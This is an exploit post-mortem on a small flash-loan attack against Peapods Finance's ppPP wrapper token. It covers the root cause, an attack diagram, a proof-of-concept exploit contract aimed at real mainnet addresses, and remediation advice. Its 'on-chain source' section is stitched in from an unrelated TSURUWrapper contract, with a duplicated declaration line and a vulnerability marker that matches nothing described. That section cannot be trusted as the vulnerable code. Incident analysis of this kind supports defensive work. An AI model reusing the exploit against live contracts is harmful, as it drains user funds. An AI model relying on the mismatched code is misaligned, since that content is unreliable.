# Peapods Finance — Flash Loan-Based Bond Accumulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-27 |
| **Protocol** | Peapods Finance (ppPP) |
| **Chain** | Ethereum |
| **Loss** | ~$1,000 |
| **Attacker** | [0xbed4fbf7](https://etherscan.io/address/0xbed4fbf7c3e36727ccdab4c6706c3c0e17b10397) |
| **Vulnerable Contract** | [ppPP 0xdbb20a97](https://etherscan.io/address/0xdbb20a979a92cccce15229e41c9b082d5b5d7e31) |
| **Root Cause** | Repeatedly calling `bond()` inside the `flash()` callback to accumulate ppPP tokens, then recovering the full amount via `debond()` — identical pattern to BarleyFinance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/PeapodsFinance_exp.sol) |

---

## 1. Vulnerability Overview

The ppPP wrapper token of Peapods Finance contains a flash loan vulnerability structurally identical to BarleyFinance's wBARL. In the `flash()` → `callback()` chain, depositing the borrowed Peas tokens via `bond()` accumulates ppPP, and after 20 loop iterations, the full amount can be recovered via `debond()`. While the loss is small ($1K), the vulnerability structure is identical to BarleyFinance ($130K).

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: bond allowed inside flash callback
interface IppPP {
    function flash(address recipient, address token, uint256 amount, bytes calldata data) external;
    function bond(address token, uint256 amount) external;
    function debond(uint256 amount, address[] memory tokens, uint8[] memory percents) external;
    function callback(bytes calldata data) external;
}

// No logic to block bond() during flash() execution
// → Repeated calls allow unlimited ppPP accumulation

// ✅ Safe code
bool private _flashActive;

modifier noFlashActive() {
    require(!_flashActive, "flash active");
    _;
}

function bond(address token, uint256 amount) external noFlashActive {
    // Normal bond logic
}

function flash(...) external {
    _flashActive = true;
    // flash logic
    _flashActive = false;
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: WeightedIndex.sol
contract TSURUWrapper {
contract TSURUWrapper is ERC20, IERC1155Receiver, IERC721Receiver, ReentrancyGuard, Ownable{
    IERC1155 public immutable erc1155Contract;
    IERC721 public immutable erc721Contract;
    uint256 public immutable tokenID;

    uint256 public constant _maxTotalSupply = 431_386_000 * 1e18;
    uint256 private constant ERC721_RATIO = 400 * 1e18; // 1 ERC721 = 400 * 10^18 ERC20
    uint256 private constant ERC1155_RATIO = 400_000 * 1e18; // 1 ERC1155 = 400_000 * 10^18 ERC20

    address private constant _mintAddress01 = address(0x7A1B3bA1a848696f2AD29dC85923DCA078F1bF1E);  // ❌ vulnerability
    address private constant _mintAddress02 = address(0x49b7f6414999551FA27C2b3abd588928A6334C96);
    address private constant _mintAddress03 = address(0x8f9e2f10CC75D7e765F5fB7fCAcE8A3fDE9D23FF);
    address private constant _mintAddress04 = address(0x5222f9facd6998DE73d45175efE56A38639Ed10b);
    address private constant _mintAddress05 = address(0xbB8891671e8FA53E616bb826C800d78C748fe963);
    address private constant _mintAddress06 = address(0x6A355388555433CD876D1C01485523Ec1f464690);
    address private constant _mintAddress07 = address(0xa9F6299A7DEAafc4a92AcB73fdF02ED4C72ce3b2);
    address private constant _mintAddress08 = address(0xa9F6299A7DEAafc4a92AcB73fdF02ED4C72ce3b2);

    // total init mint: 258_831_600 * 10^18
    uint256 private constant _mintAmount01 = 172_554_400 * 1e18;
    uint256 private constant _mintAmount02 = 3_451_088 * 1e18;
    uint256 private constant _mintAmount03 = 9_490_492 * 1e18;
    uint256 private constant _mintAmount04 = 14_365_154 * 1e18;
    uint256 private constant _mintAmount05 = 8_627_720 * 1e18;
    uint256 private constant _mintAmount06 = 21_569_300 * 1e18;
    uint256 private constant _mintAmount07 = 14_408_292 * 1e18;
    uint256 private constant _mintAmount08 = 14_365_154 * 1e18;

    bool private _opened;

    mapping(address owner => uint256) private _balancesOfOwner;
    uint256 private _holders;

    constructor(
        address initialOwner,
        address _erc1155Address,
        address _erc721Contract,
        uint256 _tokenID,
        string memory _name,
        string memory _symbol
    ) ERC20(_name, _symbol) Ownable(initialOwner) {
        require(_erc1155Address != address(0), "Invalid ERC1155 address");
        require(_erc721Contract != address(0), "Invalid ERC721 address");
        erc1155Contract = IERC1155(_erc1155Address);
        erc721Contract = IERC721(_erc721Contract);

        tokenID = _tokenID;
        _opened = false;
        _holders = 0;

        _safeMint(_mintAddress01, _mintAmount01);
        _safeMint(_mintAddress02, _mintAmount02);
        _safeMint(_mintAddress03, _mintAmount03);
        _safeMint(_mintAddress04, _mintAmount04);
        _safeMint(_mintAddress05, _mintAmount05);
        _safeMint(_mintAddress06, _mintAmount06);
        _safeMint(_mintAddress07, _mintAmount07);
        _safeMint(_mintAddress08, _mintAmount08);
    }

    function onERC721Received(
        address,
        address from,
        uint256,
        bytes calldata
    ) external override nonReentrant returns (bytes4) {
        require(_opened, "Already yet open.");
        require(msg.sender == address(erc721Contract), "Unauthorized token");
        _safeMint(from, ERC721_RATIO); // Adjust minting based on the ERC721_RATIO
        return this.onERC721Received.selector;
    }

    function onERC1155Received(
        address,
        address from,
        uint256 id,
        uint256 amount,
        bytes calldata
    ) external override nonReentrant returns (bytes4) {
        require(id == tokenID, "Token ID does not match");
        
        if (msg.sender == address(erc1155Contract)) {
            return this.onERC1155Received.selector;
        }

        _safeMint(from, amount * ERC1155_RATIO); // Adjust minting based on the ERC1155_RATIO
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure override returns (bytes4) {
        revert("Batch transfer not supported");
    }

    function unwrap(uint256 erc20Amount) external {
        require(erc20Amount >= ERC1155_RATIO, string.concat("Minimum unwrap amount is 1 ERC1155 token: ", Strings.toString(erc20Amount)));
        require(balanceOf(msg.sender) >= erc20Amount, "Check the balance of account");
        uint256 erc1155Amount = erc20Amount / ERC1155_RATIO; // Calculate the amount of ERC1155 tokens to unwrap
        uint256 remainderERC20Amount = erc20Amount % ERC1155_RATIO; // Calculate the remainder of ERC20 tokens

        _safeBurn(msg.sender, erc20Amount); // Burn the entire ERC20 amount requested for unwrap
        if (erc1155Amount > 0) {
            erc1155Contract.safeTransferFrom(
                address(this),
                msg.sender,
                tokenID,
                erc1155Amount,
                ""
            );
        }
        if (remainderERC20Amount > 0) {
            _safeMint(msg.sender, remainderERC20Amount); // Re-mint the remainder of ERC20 tokens back to the user
        }
    }

    function supportsInterface(bytes4 interfaceId)
        public
        view
        virtual
        override
        returns (bool)
    {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }

    function maxTotalSupply() public view virtual returns (uint256) {
        return _maxTotalSupply;
    }

    function holders() public view virtual returns (uint256) {
        return _holders;
    }

    function opened() public view virtual returns (bool) {
        return _opened;
    }

    function open() external onlyOwner {
        _opened = true;
    }

    function close() external onlyOwner {
        _opened = false;
    }

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Acquire 200 DAI
  │
  ├─→ [2] Repeat 20 times:
  │       ├─→ approve 10 DAI → ppPP.flash(full Peas balance)
  │       └─→ callback(): bond(Peas) → accumulate ppPP
  │
  ├─→ [3] debond(accumulated ppPP, 100%) → recover large amount of Peas
  │
  ├─→ [4] Peas → DAI → WETH (Uniswap V3 exactInput)
  │
  └─→ [5] ~$1K profit (small scale but structurally identical vulnerability)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IppPP {
    function flash(address recipient, address token, uint256 amount, bytes calldata data) external;
    function bond(address token, uint256 amount) external;
    function debond(uint256 amount, address[] memory tokens, uint8[] memory percents) external;
    function callback(bytes calldata data) external;
}

contract AttackContract {
    IppPP  constant ppPP = IppPP(0xdbb20a979a92cccce15229e41c9b082d5b5d7e31);
    IERC20 constant Peas = IERC20(0x02f92800F57BCD74066F5709F1Daa1A4302Df875);
    IERC20 constant DAI  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function testExploit() external {
        // [1] Flash loan loop 20 times
        for (uint i = 0; i < 20; i++) {
            DAI.approve(address(ppPP), 10 ether);
            ppPP.flash(address(this), address(Peas), Peas.balanceOf(address(ppPP)), "");
        }

        // [2] Debond the full accumulated ppPP balance
        address[] memory tokens = new address[](1);
        tokens[0] = address(Peas);
        uint8[] memory percents = new uint8[](1);
        percents[0] = 100;
        ppPP.debond(ppPP.balanceOf(address(this)), tokens, percents);

        // [3] Swap Peas → WETH
        peasToWETH();
    }

    function callback(bytes calldata) external {
        Peas.approve(address(ppPP), type(uint256).max);
        ppPP.bond(address(Peas), Peas.balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan-based repeated bond accumulation |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (repeated flash loan calls) |
| **DApp Category** | Wrapped token / Index token |
| **Impact** | Protocol fund drain |

## 6. Remediation Recommendations

1. **Flash loan active flag**: Use a `_flashActive` state variable to block `bond`/`debond` during flash execution
2. **Callback function restriction**: Strictly limit the set of functions permitted within the flash callback
3. **Prevent recurrence of identical patterns**: After the BarleyFinance vulnerability disclosure, immediately patch all protocols using the same structure
4. **Balance invariant verification**: Verify that internal balances match before and after a flash loan

## 7. Lessons Learned

- The fact that the same vulnerability as BarleyFinance (2024-01-22) was discovered in Peapods Finance just 5 days later highlights the issue of vulnerability sharing and code forking.
- Rapid security advisories for known vulnerability patterns and auditing of forked protocols are critical.
- Even when the loss is small, if the vulnerability structure is identical, it can escalate into a large-scale attack.